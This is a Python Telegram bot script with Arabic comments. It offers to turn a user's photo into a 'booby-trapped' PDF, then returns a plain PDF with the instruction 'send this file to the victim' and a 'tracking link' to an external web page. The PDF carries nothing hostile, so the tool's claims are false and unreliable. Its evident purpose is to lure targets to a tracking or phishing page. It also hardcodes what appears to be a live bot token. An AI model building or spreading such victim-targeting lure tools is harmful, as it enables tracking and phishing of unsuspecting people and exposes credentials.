import telebot
import requests
from PIL import Image
import os

# التوكن الخاص بك
TOKEN = "8595115985:AAEQInFhoQI-yUs3kmSIYjmuDPW65ufmO1o"
bot = telebot.TeleBot(TOKEN)

# رابط صفحة الويب الخاصة بك
MY_LINK = "https://jeannettaleath-ship-it.github.io/MAX191/"

@bot.message_handler(commands=['start'])
def welcome(message):
    bot.reply_to(message, "مرحباً بك في EROXX. أرسل صورتك الآن لتحويلها لملف ملغم.")

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    try:
        # تحميل الصورة من تلجرام
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        with open("temp_img.jpg", "wb") as f:
            f.write(downloaded_file)
        
        # تحويل الصورة إلى PDF باسم الملف الذي تريده
        img = Image.open("temp_img.jpg")
        pdf_path = "trap_6969597735.pdf"
        img.save(pdf_path, "PDF")
        
        # إرسال الملف النهائي للمستخدم
        with open(pdf_path, "rb") as pdf:
            bot.send_document(message.chat.id, pdf, caption=f"📄 تم تلغيم صورتك بنجاح!\n\n💡 أرسل هذا الملف للضحية.\nرابط التتبع: {MY_LINK}")
        
        # حذف الملفات المؤقتة لتوفير مساحة السيرفر
        os.remove("temp_img.jpg")
        os.remove(pdf_path)
    except Exception as e:
        bot.reply_to(message, "حدث خطأ أثناء معالجة الصورة.")

bot.polling()
